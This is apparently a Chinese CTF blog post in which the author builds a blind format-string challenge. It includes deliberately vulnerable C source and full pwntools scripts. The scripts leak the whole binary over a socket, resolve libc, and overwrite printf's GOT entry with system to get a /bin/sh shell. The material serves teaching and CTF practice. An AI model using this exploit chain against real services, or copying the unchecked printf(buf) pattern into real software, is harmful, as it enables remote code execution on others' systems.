---
title:  Leak me
subtitle: 格式化字符串出题
time: 2017.12.26 10:00:00
layout: post
catalog: true
tags:
- Binary
- fmtstr
excerpt: 超哥的《软件漏洞挖掘与利用》课程作业，要求我们互相出一道二进制题，互相交流学习。我出了一道无Binary和Libc的格式化字符串题目，主要想模仿Web下完全黑盒的状态，只给攻击者一个IP及port。出题思路在一些CTF赛事中已经出现过，不算新颖。分享给大家，共勉。
---



# Leak me

> 一道简单的Blind 格式化字符串题目。

## 源码：

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    setbuf(stdin, 0LL);
    setbuf(stdout, 0LL);
    setbuf(stderr, 0LL);
    int flag;
    char buf[1024];
    FILE* f;

    puts("What's your name?");

    fgets(buf, 1024, stdin);
    printf("Hi, ");
    printf("%s",buf);
    putchar('\n');

    flag = 1;
    while (flag == 1){
        puts("Do you want the flag?");

	memset(buf,'\0',1024);
	read(STDIN_FILENO, buf, 100);
        if (!strcmp(buf, "no\n")){
            printf("I see. Good bye.");
            return 0;
        }else
	{   
	    printf("Your input isn't right:");
	    printf(buf);
	    printf("Please Try again!\n");
	}
	fflush(stdout);
    }
    return 0;
}

```

编译：

```
gcc -z execstack -fno-stack-protector -m32 -o leakmemory leakmemory.c
```

部署：

```
socat TCP4-LISTEN:10001,fork EXEC:./leakmemory
```

对外只公布IP及端口号，做题者所需的任何数据都需要通过leak获得。



## 考点：

1. Blink 格式化字符串漏洞
2. 内存泄漏整个Binary



## 分析：

### 题目逻辑：

![题目逻辑](http://momomoxiaoxi.com/img/post/Fmtstr/logic.png)

这是一个简单的格式化字符串漏洞。

漏洞主要存在在第二个printf中，具体代码如下：

```
	    printf("Your input isn't right:");
	    printf(buf);
	    printf("Please Try again!\n");
```

我们可以通过输入控制buf，从而泄漏数据。

本题主要设计的考点是通过格式化字符串泄漏整个二进制文件，从而盲打劫持GOT表获取系统权限。

接下来，我们进行分析测试。

![1](http://momomoxiaoxi.com/img/post/Fmtstr/1.png)

测试出，偏移为7。这样我们就能得到payload: `addr + %7$s`, 返回值为`addr`指向的内存的字符串，直到`\0`为止.

然而，如果此时addr中带有0x00会发生截断，因此我们修改payload为`%8$s+p32(0x8048000)`对应的堆栈图如下：

![堆栈](http://momomoxiaoxi.com/img/post/Fmtstr/statck.png)





因此，我们可以写脚本泄漏整个二进制文件：

> 这里最好从0x8048000开始泄漏，不要只泄漏.text段。不然，会有很多符号解析数据没有泄漏下来。

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import binascii
# context.log_level = 'debug'

r = remote('127.0.0.1',9999)
r.recv()
r.sendline('moxiaoxi')
r.recv()

def leak(addr):
    payload = "%9$s.TMP" + p32(addr)
    r.sendline(payload)
    print "leaking:", hex(addr)
    r.recvuntil('right:')
    resp = r.recvuntil(".TMP")
    ret = resp[:-4:]
    print "ret:", binascii.hexlify(ret), len(ret)
    remain = r.recvrepeat(0.2)
    return ret


begin = 0x8048000
text_seg =''
try:
    while True:
        ret = leak(begin)
        text_seg += ret
        begin += len(ret)
        if len(ret) == 0:
            begin +=1
            text_seg += '\x00'
except Exception as e:
    print e
finally:
    print '[+]',len(text_seg)
    with open('dump_bin','wb') as f:
        f.write(text_seg)


```

在进行dump的过程中实际上是需要注意一些内容的，原因是%s进行输出时实际上是x00截断的，但是.text段中不可避免会出现x00，但是我们注意到还有一个特性，如果对一个x00的地址进行leak，返回是没有结果的，因此如果返回没有结果，我们就可以确定这个地址的值为x00，所以可以设置为x00然后将地址加1进行dump。

内存数据dump下来后，虽然跟原始bin有很大不同，也运行不了，但是丢到ida中仍然是可以看的:

![2](http://momomoxiaoxi.com/img/post/Fmtstr/2.png)

> 注：这里由于是leak下来的二进制，没有偏移，我们需要手动rebase。
>
> ![rebase](http://momomoxiaoxi.com/img/post/Fmtstr/rebase.png)

得到printf@plt地址：

![printf](http://momomoxiaoxi.com/img/post/Fmtstr/printf.png)

接下来就是覆盖got表并获取shell的流程是（以覆盖printf的got表为例）：

1. 确定printf的plt地址
2. 通过泄露plt表中的指令内容确定对应的got表地址
3. 通过泄露的got表地址泄露printf函数的地址
4. 通过泄露的printf的函数地址确定libc基址，从而获得system地址
5. 使用格式化字符串的任意写功能将printf的got表中的地址修改为system的地址
6. send字符串“/bin/sh;”，那么在调用printf(“/bin/sh;”)的时候实际上调用的是system(“/bin/sh;”)，从而成功获取shell

### EXP

#### 本地EXP

PS: 考虑万一做不出来，就给Binary和libc，降低题目难度。

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'
debug = 1
if debug:
	p = process('./leakmemory')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')

p.recv()
p.sendline('moxiaoxi')
p.recv()

elf = ELF('./leakmemory')

plt_printf = elf.symbols['printf']

got_printf = elf.got['printf']


libc_system = libc.symbols['system']
libc_printf = libc.symbols['printf']


# 获取printf的libc地址
leak_payload = "%8$s" + p32(got_printf)

p.sendline(leak_payload)
info = p.recv()
data = info[23:27]
print(data.encode('hex'))

# 计算system的libc地址
printf_addr = u32(data)
libc_base = printf_addr - libc_printf   

system_addr = libc_base + libc_system

# 生成payload
payload = fmtstr_payload(7, {got_printf: system_addr})
# print('*'*100)
# print(payload)

# 发送payload
p.sendline(payload)
p.sendline('/bin/shx00')
p.interactive()

```

![3](http://momomoxiaoxi.com/img/post/Fmtstr/3.png)

#### 远程EXP：

在远程EXP过程中，还需要leak libc函数地址。

主要方式有两种：

1. 利用DynELF暴力搜索
2. 利用libcdatabase或libdb查询

具体过程如下：

![getlibc](http://momomoxiaoxi.com/img/post/Fmtstr/getlibc.png)

这样我们就获取到了对应的偏移地址，就可以撰写最终的EXP了：
```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import binascii
# context.log_level = 'debug'

r = remote('127.0.0.1',9999)
r.recv()
r.sendline('moxiaoxi')
r.recv()

def leak(addr):
    payload = "%9$s.TMP" + p32(addr)
    r.sendline(payload)
    print "leaking:", hex(addr)
    r.recvuntil('right:')
    resp = r.recvuntil(".TMP")
    ret = resp[:-4:]
    print "ret:", binascii.hexlify(ret), len(ret)
    remain = r.recvrepeat(0.2)
    return ret


printf_plt_addr = 0x8048490
printf_plt_code = leak(printf_plt_addr)
printf_got_plt_addr = u32(printf_plt_code[2:6])


printf_addr = u32(leak(printf_got_plt_addr)[:4])

print('[+]:printf_addr',hex(printf_addr))

libc_addr = printf_addr - 0x00049670
system_addr = libc_addr + 0x0003ada0

payload = fmtstr_payload(7, {printf_got_plt_addr: system_addr})

# 发送payload
r.sendline(payload)
r.sendline('/bin/shx00')
r.interactive()
```



![exp_remote](http://momomoxiaoxi.com/img/post/Fmtstr/exp_remote.png)



## 总结

通过整个出题过程中，对格式化字符串漏洞理解加深了很多，尤其是如何通过格式化字符串泄漏内存和篡改信息。



## 参考

1. [ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_exploit.html)
2. [借助DynELF实现无libc的漏洞利用小结](https://www.anquanke.com/post/id/85129)
3. [Pwntools 高级应用](http://brieflyx.me/2015/python-module/pwntools-advanced/)
4. [格式化字符串blind pwn详细教程](https://www.anquanke.com/post/id/85731)